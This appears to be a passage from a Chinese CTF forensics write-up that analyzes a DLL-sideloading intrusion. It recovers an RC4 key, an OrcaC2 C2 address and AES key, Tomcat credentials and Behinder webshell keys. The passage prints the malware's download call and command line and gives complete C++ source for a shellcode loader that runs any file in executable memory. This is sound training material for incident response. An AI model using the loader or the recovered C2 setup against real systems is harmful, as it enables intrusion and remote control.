main\\n\\n\u9996\u5148\uff0c\u9700\u8981\u5c06\u767d EXE \u6587\u4ef6\u548c\u9ed1 DLL \u6587\u4ef6\u63d0\u53d6\u51fa\u6765\\n\\n\u4f7f\u7528\u6587\u672c\u7f16\u8f91\u5668\u6253\u5f00 msc \u6587\u4ef6\uff0c\u5b9a\u4f4d\u5230\\n\\n![img](img/image_20241153-165336.png)\\n\\n\u5c06\u4e24\u4e2a Base64 \u63d0\u53d6\u51fa\u6765\u89e3\u7801\uff0c\u5f97\u5230\u7684\u5c31\u662f `GUP.exe` \u548c `libcurl.dll`\\n\\n\u5bf9 `libcurl.dll` \u8fdb\u884c\u9006\u5411\u5206\u6790\\n\\n![img](img/image_20241102-170207.png)\\n\\n\u5bf9\u5e93\u51fd\u6570\u8fdb\u884c\u68c0\u67e5\uff0c\u5927\u90e8\u5206\u51fd\u6570\u90fd\u662f `dword` \u8fd4\u56de\uff0c\u4f46\u662f `curl_easy_init()` \u51fd\u6570\u5728 `dword` \u8fd4\u56de\u4e4b\u524d\u8c03\u7528\u4e86 `sub_10001240()` \u51fd\u6570\\n\\n```c\\nint curl_easy_init()\\n{\\n    sub_10001240(&unk_100080B0, dwSize);\\n    return dword_10029B80();\\n}\\n```\\n\\n\u5c31 `curl_easy_init()` \u51fd\u6570\u591a\u4e86\u4e00\u6b65\u51fd\u6570\u8c03\u7528\uff0c\u53ef\u4ee5\u6000\u7591\u662f `curl_easy_init()` \u51fd\u6570\u88ab\u7be1\u6539\\n\\n```flag\\n1. curl_easy_init\\n```\\n\\n### task9\\n\\n> 1. \u653b\u51fb\u8005\u6240\u4f7f\u7528\u7684\u9ed1 DLL \u89e3\u5bc6\u4e0b\u4e00\u9636\u6bb5\u8f7d\u8377\u6240\u4f7f\u7528\u7684\u7b97\u6cd5\u662f\u4ec0\u4e48? \u793a\u4f8b: chacha20\\n>\\n> 2. \u653b\u51fb\u8005\u6240\u4f7f\u7528\u7684\u9ed1 DLL \u89e3\u5bc6\u4e0b\u4e00\u9636\u6bb5\u8f7d\u8377\u6240\u4f7f\u7528\u7684 Key \u662f\u4ec0\u4e48? (\u6ce8\u610f: \u8bf7\u63d0\u4ea4\u4e00\u6bb5\u5c0f\u5199\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32) \u793a\u4f8b: 1122334455\\n\\n\u8ddf\u8fdb\u5206\u6790 `sub_10001240()` \u51fd\u6570\uff0c\u76f4\u63a5\u5c06\u53cd\u7f16\u8bd1\u7ed3\u679c\u4e22\u7ed9 `ChatGPT 4o` \u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u56de\u590d\\n\\n:::info \u8d5e\u7f8e GPT\\n\\n\u8be5\u53cd\u7f16\u8bd1\u7ed3\u679c\u6d89\u53ca\u7684\u4ee3\u7801\u5b9e\u73b0\u4e86\u4e00\u4e2a\u52a0\u5bc6\u7b97\u6cd5\uff0c\u901a\u5e38\u662f\u57fa\u4e8e\u4e00\u79cd\u7c7b\u4f3c RC4 \u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08PRNG\uff09\u6a21\u5f0f\uff0c\u7ed3\u5408\u4e86\u72b6\u6001\u6df7\u5408\u3001\u5b57\u8282\u5f02\u6216\uff08XOR\uff09\u64cd\u4f5c\u548c\u5b57\u8282\u4ea4\u6362\u7684\u64cd\u4f5c\u3002\u4ee5\u4e0b\u662f\u5bf9\u8be5\u52a0\u5bc6\u7b97\u6cd5\u7684\u5206\u6790\uff1a\\n\\n1. \u521d\u59cb\u5316\u9636\u6bb5\\n   - \u5b57\u7b26\u4e32\u521d\u59cb\u5316\uff1a\\n     - `v41` \u548c `v42` \u7684\u503c\uff08`-1952638222` \u548c `23838`\uff09\u901a\u8fc7\u8ba1\u7b97 `strlen` \u548c `8 * v1` \u6765\u521d\u59cb\u5316\u72b6\u6001\u3002\\n     - \u5982\u679c\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u4e58\u4ee5 8 \u5c0f\u4e8e 32\uff0c\u5219\u521d\u59cb\u5316\u4e00\u4e2a 32 \u5b57\u8282\u5927\u5c0f\u7684\u7f13\u51b2\u533a\u3002\\n\\n   - \u5185\u5b58\u5206\u914d\uff1a\\n     - \u4f7f\u7528 `malloc` \u4e3a\u52a0\u5bc6 / \u89e3\u5bc6\u8fc7\u7a0b\u5206\u914d\u5185\u5b58\uff0c\u6839\u636e\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u6765\u51b3\u5b9a\u5206\u914d\u5927\u5c0f\u3002\\n\\n2. \u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08PRNG\uff09**\\n   - \u4f7f\u7528\u4e00\u7cfb\u5217\u4f4d\u8fd0\u7b97\u548c `SSE` \u6307\u4ee4\uff08\u5982 `_mm_and_ps`\u3001`_mm_add_epi32`\u3001`_mm_shuffle_epi32` \u7b49\uff09\u751f\u6210\u4f2a\u968f\u673a\u6570\u3002\u6b64\u8fc7\u7a0b\u6d89\u53ca\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a\\n     - \u5c06\u6bcf\u4e2a\u8f93\u5165\u7684\u5b57\u8282\u7ecf\u8fc7\u4e00\u7cfb\u5217\u7684\u4f4d\u79fb\u3001\u6dfb\u52a0\u5e38\u91cf\u548c\u6309\u4f4d\u4e0e\u64cd\u4f5c\uff0c\u4ece\u800c\u751f\u6210\u4f2a\u968f\u673a\u7684\u5b57\u8282\u6d41\u3002\\n     - \u6bcf\u6b21\u751f\u6210\u7684\u65b0\u968f\u673a\u6570\u90fd\u7ecf\u8fc7\u4e86\u6df7\u5408\u3001\u6253\u5305\uff08`_mm_packus_epi16`\uff09\u548c\u8f6c\u6362\uff08`_mm_cvtsi128_si32`\uff09\u64cd\u4f5c\u3002\\n     - \u751f\u6210\u7684\u968f\u673a\u6570\u88ab\u7528\u4e8e\u66f4\u65b0\u5bc6\u94a5\u6d41\u7f13\u51b2\u533a `v34` \u4e2d\u7684\u6570\u636e\u3002\\n\\n3. \u52a0\u5bc6\u8fc7\u7a0b\\n   - \u52a0\u5bc6\u5faa\u73af\uff1a\\n     - \u91c7\u7528\u7c7b\u4f3c RC4 \u7684\u52a0\u5bc6\u65b9\u5f0f\uff0c\u901a\u8fc7\u5bf9\u6bcf\u4e2a\u5b57\u8282\u6267\u884c\u5f02\u6216\uff08XOR\uff09\u64cd\u4f5c\u6765\u52a0\u5bc6\u6570\u636e\uff1a\\n       - \u6bcf\u6b21\u8ba1\u7b97\u65b0\u7684\u4f4d\u7f6e\u7d22\u5f15\u5e76\u901a\u8fc7 `v34` \u6570\u7ec4\u4e2d\u7684\u503c\u6765\u66f4\u65b0\u548c\u4fee\u6539\u52a0\u5bc6\u7684\u72b6\u6001\u3002\\n       - `this[v25] ^= v34[(v27 + (unsigned __int8)v34[v38]) % v35];` \u8fd9\u4e00\u884c\u8868\u793a\u5bf9\u8f93\u5165\u6570\u636e\uff08`this`\uff09\u8fdb\u884c\u52a0\u5bc6\u5904\u7406\u3002\\n     - \u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u4f1a\u6267\u884c\u5b57\u8282\u4ea4\u6362\uff08`v34[(v25 + v38) % v35] ^= v40;`\uff09\u4ee5\u8fdb\u4e00\u6b65\u6253\u4e71\u52a0\u5bc6\u72b6\u6001\u3002\\n\\n4. \u5bc6\u94a5\u8c03\u5ea6\u4e0e\u52a8\u6001\u8c03\u6574\\n   - \u4f7f\u7528 `v41`\u3001`v42` \u548c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u8f93\u51fa\u4f5c\u4e3a\u52a8\u6001\u7684\u5bc6\u94a5\u8c03\u5ea6\u7b97\u6cd5\uff08KSA\uff09\uff0c\u8fd9\u4e2a\u7b97\u6cd5\u4f1a\u6839\u636e\u8f93\u5165\u7684\u5927\u5c0f\u548c\u5b57\u8282\u503c\u6765\u4fee\u6539\u5bc6\u94a5\u6d41\u3002\\n   - \u968f\u673a\u5b57\u8282\u751f\u6210\u548c\u5bc6\u94a5\u6d41\u7684\u6df7\u5408\u5e2e\u52a9\u52a0\u5f3a\u4e86\u52a0\u5bc6\u7b97\u6cd5\u7684\u590d\u6742\u6027\uff0c\u4f7f\u5f97\u8f93\u51fa\u52a0\u5bc6\u7ed3\u679c\u66f4\u52a0\u96be\u4ee5\u9884\u6d4b\u3002\\n\\n5. \u52a0\u5bc6\u7ed3\u679c\u7684\u4fdd\u5b58\u4e0e\u8f93\u51fa\\n   - \u52a0\u5bc6\u540e\u7684\u6570\u636e\u4f1a\u5b58\u5165 `lpProc` \u4e2d\uff0c\u5e76\u6700\u7ec8\u901a\u8fc7 `memcpy` \u590d\u5236\u5230\u5916\u90e8\u3002\\n   - \u5728\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\uff0c\u4f7f\u7528\u4e86\u4e00\u4e9b\u56fe\u5f62\u754c\u9762\u76f8\u5173\u7684 API\uff08\u5982 `GetDC(0)` \u548c `EnumFontsW`\uff09\uff0c\u8fd9\u53ef\u80fd\u4e0e\u6570\u636e\u52a0\u5bc6\u7684\u7528\u9014\u65e0\u5173\uff0c\u6216\u662f\u4ee3\u7801\u5728\u5904\u7406\u52a0\u5bc6\u540e\u7684\u6570\u636e\u65f6\u5bf9\u5176\u8fdb\u884c\u4e86\u56fe\u5f62\u5316\u7684\u5c55\u793a\u6216\u8f93\u51fa\u3002\\n\\n6. \u603b\u7ed3\\n   - \u8be5\u7b97\u6cd5\u6574\u4f53\u4e0a\u6a21\u4eff\u4e86\u7ecf\u5178\u7684\u6d41\u5bc6\u7801\u7b97\u6cd5\uff0c\u5982 RC4\uff0c\u4f46\u5b83\u7ed3\u5408\u4e86\u590d\u6742\u7684\u72b6\u6001\u6df7\u5408\u548c\u5b57\u8282\u4ea4\u6362\u673a\u5236\u3002\u901a\u8fc7\u591a\u4e2a\u9636\u6bb5\u7684\u4f4d\u64cd\u4f5c\u548c\u4f2a\u968f\u673a\u6570\u751f\u6210\uff0c\u80fd\u591f\u52a0\u5bc6\u8f93\u5165\u6570\u636e\u3002\\n   - \u8be5\u52a0\u5bc6\u7b97\u6cd5\u7684\u5b89\u5168\u6027\u4f9d\u8d56\u4e8e\u5bc6\u94a5\u8c03\u5ea6\u7b97\u6cd5\u548c\u4f2a\u968f\u673a\u6570\u751f\u6210\u7684\u590d\u6742\u5ea6\uff0c\u4f46\u5176\u4f9d\u65e7\u5bb9\u6613\u53d7\u5230\u4e00\u4e9b\u5e38\u89c1\u7684\u5bc6\u7801\u5206\u6790\u653b\u51fb\uff08\u5982\u9891\u7387\u5206\u6790\uff09\u7684\u5f71\u54cd\u3002\\n\\n7. \u53ef\u80fd\u7684\u6539\u8fdb\uff1a\\n   - \u5f15\u5165\u66f4\u5f3a\u7684\u6df7\u5408\u7b97\u6cd5\uff0c\u5982\u66f4\u590d\u6742\u7684\u52a0\u5bc6\u6a21\u5f0f\uff08\u4f8b\u5982 AES\uff09\u6765\u589e\u5f3a\u7b97\u6cd5\u7684\u6297\u653b\u51fb\u6027\u3002\\n   - \u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u52a0\u5165\u66f4\u591a\u7684\u52a8\u6001\u53d8\u5316\u548c\u4e0d\u540c\u7684\u52a0\u5bc6\u5b50\u7b97\u6cd5\uff0c\u907f\u514d\u6f5c\u5728\u7684\u6a21\u5f0f\u66b4\u9732\u3002\\n\\n:::\\n\\n:::warning\\n\\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6309\u7167 RC4 \u6807\u51c6\u5b9e\u73b0\u7684\u6e90\u4ee3\u7801\u8fdb\u884c\u5bf9\u5e94\uff0c\u4f1a\u53d1\u73b0\u5e76\u975e\u6807\u51c6\u7684 RC4 \u5b9e\u73b0\uff0c\u4e0d\u53ef\u4ee5\u76f4\u63a5\u6284\u677f\u5b50\u8fdb\u884c\u89e3\u5bc6\\n\\n:::\\n\\n\u5bf9\u4e8e RC4 \u7b97\u6cd5\u7684 key\uff0c\u53ef\u4ee5\u6ce8\u610f\\n\\n![img](img/image_20241111-171108.png)\\n\\n\u5c06 `v41`,`v42` \u4f5c\u4e3a `Char` \u53d8\u91cf\u8fdb\u884c\u67e5\u770b\uff0c\u5f97\u5230 `\\\\x5D\\\\x1E\\\\x8B\\\\x9D\\\\x1A\\\\xF2`\\n\\n\u7531\u4e8e `key` \u662f\u4f7f\u7528\u5c0f\u7aef\u5e8f\u8fdb\u884c\u50a8\u5b58\uff0c\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\n1. RC4\\n2. f21a9d8b1e5d\\n```\\n\\n### task10\\n\\n> 1. \u653b\u51fb\u8005\u6240\u4f7f\u7528\u7684\u4e0b\u4e00\u9636\u6bb5\u8f7d\u8377\u7684\u56de\u8fde C2 \u662f\u4ec0\u4e48? (\u6ce8\u610f: \u9700\u8981\u63d0\u4f9b ip \u5730\u5740: \u7aef\u53e3\u7684\u5f62\u5f0f) \u793a\u4f8b: 127.0.0.1:5100\\n\\n\u9996\u5148\uff0c\u5148\u5c06 `libcurl.dll` \u4e2d\u7684\u8f7d\u8377\u8fdb\u884c\u63d0\u53d6\\n\\n\u5206\u6790 `sub_10001240()` \u51fd\u6570\u7684\u8c03\u7528\\n\\n```c\\nsub_10001240(&unk_100080B0, dwSize);\\n```\\n\\n\u6839\u636e\u51fd\u6570\u5b9a\u4e49\\n\\n```c\\nint __thiscall sub_10001240(_BYTE *this)\\n```\\n\\n\u4ee5\u53ca\u5bf9\u4e8e\u51fd\u6570\u903b\u8f91\u7684\u57fa\u672c\u5206\u6790\uff0c\u53ef\u4ee5\u786e\u5b9a\u6570\u636e\u50a8\u5b58\u5728 `&unk_100080B0` \u4e2d\uff0c\u90a3\u4e48\u53ef\u4ee5\u76f4\u63a5\u5728 `sub_10001240()` \u51fd\u6570\u7684 `memcpy(lpProc, this, v23);` \u8bed\u53e5\u4e0b\u65ad\u70b9\\n\\n![img](img/image_20241121-172124.png)\\n\\n\u7136\u540e\u914d\u7f6e\u52a8\u6001\u8c03\u8bd5\u7684\u53c2\u6570\\n\\n![img](img/image_20241121-172154.png)\\n\\n\u542f\u52a8\u8c03\u8bd5\\n\\n![img](img/image_20241122-172221.png)\\n\\n\u67e5\u770b `byte_67D880B0` \u7684\u5185\u5b58\\n\\n![img](img/image_20241122-172252.png)\\n\\n\u5bf9\u5176 dump \u51fa\u6765\uff0c\u53ef\u4ee5\u53d1\u73b0\u662f\u53ef\u6267\u884c\u6570\u636e\\n\\n![img](img/image_20241123-172324.png)\\n\\n\u4e0b\u8f7d\u4e0b\u6765\uff0c\u53cd\u7f16\u8bd1\uff0c\u5f97\u5230\\n\\n![img](img/image_20241125-172506.png)\\n\\n\u7ecf\u8fc7\u5206\u6790\uff0c\u53ef\u4ee5\u786e\u5b9a `sub_4013E0()` \u51fd\u6570\u662f\u4e0b\u8f7d\u51fd\u6570\uff0c\u90a3\u4e48\u5728 `v8 = (void (*)(void))sub_4013E0(v7);` \u8bed\u53e5\u4e0b\u65ad\u70b9\u8fdb\u884c\u8c03\u8bd5\\n\\n![img](img/image_20241127-172720.png)\\n\\n\u63d0\u53d6\u51fa\u6765\u5177\u4f53\u7684\u53c2\u6570\\n\\n```c\\nsub_7E13E0(\\"192.168.57.119\\", 6000, \\"files/1730391917.bin\\")\\n```\\n\\n\u8fd9\u5c31\u662f\u4e0b\u8f7d\u4e0b\u4e00\u9636\u6bb5\u8f7d\u8377\u7684\u8bed\u53e5\uff0c\u5e76\u4e14\u8fd9\u4e0e `challenge.pcapng` \u6d41\u91cf\u6570\u636e\u76f8\u543b\u5408\\n\\n![img](img/image_20241131-173122.png)\\n\\n\u8ddf\u8fdb\u6d41\u91cf\u5305\uff0c\u6b64\u90e8\u5206\u6267\u884c\u4e4b\u540e\u80af\u5b9a\u4f1a\u6267\u884c\u56de\u8fde\u64cd\u4f5c\\n\\n![img](img/image_20241132-173220.png)\\n\\n\u57fa\u4e8e\u6b64\u5373\u53ef\u786e\u5b9a\u56de\u8fde\u5730\u5740\\n\\n```flag\\n1. 192.168.57.119:6000\\n```\\n\\n### task11\\n\\n> 1. \u653b\u51fb\u8005\u6240\u4f7f\u7528\u6700\u7ec8\u9636\u6bb5\u8f7d\u8377\u6240\u4f7f\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\u662f\u4ec0\u4e48? \u793a\u4f8b: DES\\n\\n\u9996\u5148\uff0c\u9700\u8981\u4ece `pacpng` \u6587\u4ef6\u4e2d\uff0c\u5c06 `1730391917.bin` \u6587\u4ef6 dump \u51fa\u6765\\n\\n\u4f7f\u7528 Shellcode Loader \u52a0\u8f7d `1730391917.bin` \u6587\u4ef6\\n\\n:::warning\\n\\n\u8fd9\u4efd\u4ee3\u7801\u9700\u8981\u4f7f\u7528 Visual Studio \u6765\u7f16\u8bd1\\n\\ng++ \u7f16\u8bd1\u4f1a\u51fa\u73b0\u5185\u5b58\u8bbf\u95ee\u975e\u6cd5\u7684\u95ee\u9898\\n\\n:::\\n\\n:::info\\n\\n\u4ea6\u53ef\u4ee5\u4f7f\u7528 [volexity/donut-decryptor: Retrieve inner payloads from Donut samples](https://github.com/volexity/donut-decryptor) \u8fdb\u884c\u9759\u6001\u63d0\u53d6\\n\\n:::\\n\\n```cpp\\n#include <windows.h>\\n#include <iostream>\\n#include <fstream>\\n#include <vector>\\n\\nint main()\\n{\\n\\n    // \u8f93\u5165\u6587\u4ef6\u540d\\n    std::string filename;\\n    std::cout << \\"Enter the shellcode filename:\\";\\n    std::cin >> filename;\\n\\n    // \u6253\u5f00\u6587\u4ef6 1.bin\uff0c\u8bfb\u53d6 shellcode\\n    std::ifstream file(filename, std::ios::binary | std::ios::ate);\\n    if (!file.is_open())\\n    {\\n        std::cerr << \\"Failed to open shellcode file!\\" << std::endl;\\n        return -1;\\n    }\\n\\n    // \u83b7\u53d6\u6587\u4ef6\u5927\u5c0f\uff0c\u5e76\u8bfb\u53d6\u5185\u5bb9\u5230 buffer \u4e2d\\n    std::streamsize size = file.tellg();\\n    file.seekg(0, std::ios::beg);\\n\\n    std::vector<unsigned char> shellcode(size);\\n    if (!file.read(reinterpret_cast<char *>(shellcode.data()), size))\\n    {\\n        std::cerr << \\"Failed to read shellcode file!\\" << std::endl;\\n        return -1;\\n    }\\n    file.close();\\n\\n    // \u5206\u914d\u5185\u5b58\uff0c\u8bbe\u7f6e\u4e3a\u53ef\u6267\u884c\u3001\u53ef\u5199\u548c\u53ef\u8bfb\\n    void *execMem = VirtualAlloc(\\n        0,                // \u81ea\u52a8\u9009\u62e9\u5206\u914d\u5730\u5740\\n        shellcode.size(), // \u5206\u914d\u7684\u5927\u5c0f\\n        MEM_COMMIT | MEM_RESERVE,\\n        PAGE_EXECUTE_READWRITE // \u8bbe\u7f6e\u9875\u5c5e\u6027\u4e3a\u53ef\u6267\u884c\\n    );\\n\\n    if (execMem == NULL)\\n    {\\n        std::cerr <<\\"VirtualAlloc failed:\\" << GetLastError() << std::endl;\\n        return -1;\\n    }\\n\\n    // \u5c06 shellcode \u590d\u5236\u5230\u5206\u914d\u7684\u5185\u5b58\\n    memcpy(execMem, shellcode.data(), shellcode.size());\\n\\n    // \u521b\u5efa\u4e00\u4e2a\u51fd\u6570\u6307\u9488\uff0c\u6307\u5411 shellcode\\n    auto shellcodeFunc = reinterpret_cast<void (*)()>(execMem);\\n\\n    // \u6267\u884c shellcode\\n    std::cout << \\"Executing shellcode...\\" << std::endl;\\n    shellcodeFunc(); // \u6267\u884c shellcode\\n\\n    // \u91ca\u653e\u5206\u914d\u7684\u5185\u5b58\\n    VirtualFree(execMem, 0, MEM_RELEASE);\\n\\n    return 0;\\n}\\n```\\n\\n\u5e76\u4e14\u4f7f\u7528 `x64debug` \u8fdb\u884c\u8c03\u8bd5\\n\\n![img](img/image_20241149-214908.png)\\n\\n\u5f53 Shellcode \u52a0\u8f7d\u5230\u5185\u5b58\u5e76\u6267\u884c\u4e4b\u540e\uff0c\u5bf9\u7a0b\u5e8f\u7684\u5185\u5b58\u7a7a\u95f4\u626b\u63cf\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u53d1\u73b0\\n\\n![img](img/image_20241144-224422.png)\\n\\n```plaintext\\npmseindw -host=192.168.57.119:6000 -key=pJB`-v)t^ZAsP$|r\\n```\\n\\n\u6839\u636e key \u7684\u957f\u5ea6\uff0c\u4ee5\u53ca\u7a0b\u5e8f\u672c\u8eab\u7684\u6d41\u91cf\u5305\\n\\n![img](img/image_20241147-224711.png)\\n\\n\u5b9a\u4f4d\u5230 [Ptkatz/OrcaC2: OrcaC2 \u662f\u4e00\u6b3e\u57fa\u4e8e Websocket \u52a0\u5bc6\u901a\u4fe1\u7684\u591a\u529f\u80fd C&C \u6846\u67b6\uff0c\u4f7f\u7528 Golang \u5b9e\u73b0](https://github.com/Ptkatz/OrcaC2)\\n\\n\u53ef\u4ee5\u786e\u5b9a\u52a0\u5bc6\u7b97\u6cd5\u4e3a `AES`\\n\\n```flag\\n1. AES\\n```\\n\\n### task12\\n\\n> 1. \u653b\u51fb\u8005\u6240\u4f7f\u7528\u6700\u7ec8\u9636\u6bb5\u8f7d\u8377\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u7684 MD5 \u662f\u4ec0\u4e48? (\u6ce8\u610f: MD5(\u5bc6\u94a5\u5185\u5bb9), \u4ee5 cyberchef \u7684\u4e3a\u51c6) \u793a\u4f8b: 9b04d152845ec0a378394003c96da594\\n\\n\u5728\u4e0a\u4e00\u9898\u4e2d\uff0c\u63d0\u53d6\u51fa\u6765\u5b57\u7b26\u4e32\\n\\n```plaintext\\npmseindw -host=192.168.57.119:6000 -key=pJB`-v)t^ZAsP$|r\\n```\\n\\n\u8ba1\u7b97\u54c8\u5e0c\\n\\n```plaintext\\npJB`-v)t^ZAsP$|r -> a524c43df3063c33cfd72e2bf1fd32f6\\n```\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\n1. a524c43df3063c33cfd72e2bf1fd32f6\\n```\\n\\n### task13\\n\\n> 1. \u653b\u51fb\u8005\u4f7f\u7528\u4e86\u4ec0\u4e48\u5bb6\u65cf\u7684 C2? \u793a\u4f8b: PoshC2\\n\\n\u5728 task11 \u4e2d\u5df2\u7ecf\u5f97\u5230\u4e86\u7b54\u6848\\n\\n```flag\\n1. OrcaC2\\n```\\n\\n## Master of DFIR - Coffee\\n\\n:::info \u9898\u76ee\u63cf\u8ff0\\n\\n\u968f\u7740\u8c03\u67e5\u7684\u6df1\u5165\u4f60\u53d1\u73b0\u60c5\u51b5\u6bd4\u4f60\u9884\u60f3\u5f97\u8981\u590d\u6742\u5f88\u591a, \u4f60\u9010\u6b65\u53d1\u73b0\u4e86\u66f4\u591a\u5165\u4fb5\u7684\u75d5\u8ff9\\n\\n\\"\u770b\u8d77\u6765\u4e0d\u80fd\u8fd9\u4e48\u65e9\u5c31\u4f11\u606f\u4e86\\" \u4e8e\u662f\u4f60\u7ee7\u7eed\u6295\u8eab\u4e8e\u4e0b\u4e00\u6b65\u7684\u8c03\u67e5\u4e2d\\n\\n\u4f60\u9700\u8981\u7ee7\u7eed\u5b8c\u6210\u9898\u76ee\u5e2e\u52a9\u9965\u6e34 C \u732b\u53d1\u6398\u6240\u6709\u7684\u771f\u76f8\\n\\n:::\\n\\n### task1\\n\\n> 1. \u53d7\u5bb3\u8005\u4e3b\u673a\u540d\u662f\u4ec0\u4e48? \u793a\u4f8b: DESKTOP-J6QZVBD\\n>\\n> 2. \u53d7\u5bb3\u8005\u64cd\u4f5c\u7cfb\u7edf\u662f\u4ec0\u4e48\u7248\u672c? \u4ee5 C2 \u56de\u663e\u4e3a\u51c6 \u793a\u4f8b: Microsoft Windows 7 \u4e13\u4e1a\u7248\\n\\n\u5df2\u7ecf\u5f97\u77e5 RAT \u7684\u901a\u4fe1 AES key \u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u89e3\u5bc6 RAT \u901a\u4fe1\u7684\u8fd4\u56de\u5305\\n\\n![img](img/image_20241120-232056.png)\\n\\n\u6267\u884c\u89e3\u5bc6\\n\\n![img](img/image_20241122-232223.png)\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\n1. DESKTOP-28DGVAU\\n2. Microsoft Windows 10 \u6559\u80b2\u7248\\n```\\n\\n### task2\\n\\n> 1. \u63a7\u5236\u7aef ClientId \u662f\u591a\u5c11? \u793a\u4f8b: c723d01b-5dc1-2601\\n>\\n> 2. \u53d7\u5bb3\u8005\u4e3b\u673a\u7684 systemId \u662f\u591a\u5c11? \u793a\u4f8b: 1b0679be72ad976ad5d491ad57a5eec0\\n\\n\u5728\u4e0a\u4e00\u9898\u4e2d\u5c31\u6709\\n\\n```flag\\n1. a55330f4-83c2-4081\\n2. 9e4a7e9ebdd51913b5d724be14868e85\\n```\\n\\n### task3\\n\\n> 1. \u653b\u51fb\u8005\u4e0b\u8f7d\u7684\u6587\u4ef6\u7684\u4fdd\u5b58\u540d\u662f\u4ec0\u4e48\uff1f \u793a\u4f8b: flag.txt\\n>\\n> 2. \u5185\u7f51\u8fd0\u884c\u7684\u4e91\u670d\u52a1\u7684\u540d\u79f0\u53eb\u4ec0\u4e48 \u793a\u4f8b: \u91d1\u5c71\u4e91\\n\\n\u7ee7\u7eed\u89e3\u5bc6\u670d\u52a1\u7aef\u7684\u8fd4\u56de\u5305\\n\\n![img](img/image_20241124-232454.png)\\n\\n\u6839\u636e\u5b57\u6bb5 `SaveFileName` \u53ef\u4ee5\u786e\u5b9a\u6267\u884c\u4e86\u6587\u4ef6\u4e0b\u8f7d\uff0c\u6587\u4ef6\u540d\u4e3a `history`\\n\\n\u540c\u65f6\uff0c\u653b\u51fb\u8005\u83b7\u53d6\u4e86\u4e00\u4e2a Sqlite \u6587\u4ef6\\n\\n![img](img/image_20241126-232621.png)\\n\\n\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n```flag\\n1. history\\n2. \u6d69\u701a\u4e91\\n```\\n\\n### task4\\n\\n> 1. tomcat \u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u591a\u5c11? \u793a\u4f8b: admin:admin\\n\\n\u5728\u540e\u7eed\u7684\u6d41\u91cf\u4e2d\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u5c1d\u8bd5\u7206\u7834 Tomcat \u7684\u51ed\u636e\\n\\n![img](img/image_20241127-232733.png)\\n\\n\u6392\u67e5\u540e\u7eed\u6d41\u91cf\uff0c\u8fd9\u4e2a\u6ca1\u6709\u8fd4\u56de 401\\n\\n![img](img/image_20241130-233030.png)\\n\\n\u5373\u53ef\u786e\u5b9a\u6b63\u786e\u7684\u51ed\u636e `dG9tY2F0OmJlYXV0aWZ1bA==`\\n\\n```plaintext\\ndG9tY2F0OmJlYXV0aWZ1bA== -> tomcat:beautiful\\n```\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\n1. tomcat:beautiful\\n```\\n\\n### task5\\n\\n> 1. webshell \u7684\u8def\u5f84? \u793a\u4f8b:/memshell/favicon.ico\\n>\\n> 2. \u653b\u51fb\u8005\u4e0a\u4f20\u7684\u6587\u4ef6\u540d? \u793a\u4f8b: flag.txt\\n\\n\u5728\u653b\u51fb\u8005\u6210\u529f\u767b\u5f55\u4e4b\u540e\uff0c\u6267\u884c\u4e86\u4e0a\u4f20\\n\\n![img](img/image_20241132-233210.png)\\n\\n\u5c06\u653b\u51fb\u8005\u4e0a\u4f20\u7684 `help.war` \u63d0\u53d6\u51fa\u6765\u5206\u6790\\n\\n![img](img/image_20241135-233549.png)\\n\\n\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n```flag\\n1. /help.jsp\\n2. help.war\\n```\\n\\n### task6\\n\\n> 1. webshell \u4e2d\u52a0\u5bc6\u7b97\u6cd5\u7684\u5bc6\u94a5\u662f\u4ec0\u4e48, \u82e5\u6709\u591a\u4e2a, \u4ee5\u52a0\u5bc6\u987a\u5e8f\u7528_\u8fde\u63a5 \u793a\u4f8b: keya_keyb\\n>\\n> 2. \u9ed1\u5ba2\u4f7f\u7528 webshell \u7ba1\u7406\u5de5\u5177\u662f\u4ec0\u4e48? (\u6ce8\u610f: \u5168\u5c0f\u5199) \u793a\u4f8b: antsword\\n\\n\u653b\u51fb\u8005\u4e0a\u4f20\u7684 war \u6587\u4ef6\u4e2d\u7684 jsp \u6587\u4ef6\uff0c\u4f7f\u7528\u52a8\u6001\u52a0\u8f7d\u4e86 Java Class\\n\\n![img](img/image_20241140-234033.png)\\n\\njsp \u6587\u4ef6\u4e2d\u5b58\u5728\u6709\u591a\u4e2a Java Class\\n\\n![img](img/image_20241147-234701.png)\\n\\n\u9010\u4e2a\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\\n\\n![img](img/image_20241147-234739.png)\\n\\n\u5e76\u4e14 Java Class \u7684\u64cd\u4f5c\u65b9\u5f0f\uff0c\u7b26\u5408\u51b0\u874e\uff08behinder\uff09\u7684\u903b\u8f91\\n\\n\u5373\u53ef\u786e\u5b9a\u7b54\u6848\\n\\n```flag\\n1. b42e327feb5d923b_82ca9b43c1b8ef8c\\n2. behinder\\n```\\n\\n### task7\\n\\n> 1. \u88ab\u9ed1\u5ba2\u7a83\u53d6\u7684\u4e91\u5b58\u50a8\u670d\u52a1\u7684\u7ba1\u7406\u5458\u8d26\u6237\u548c\u5bc6\u7801\u662f\u591a\u5c11? \u793a\u4f8b: admin:admin\\n>\\n> 2. \u653b\u51fb\u8005\u901a\u8fc7 webshell 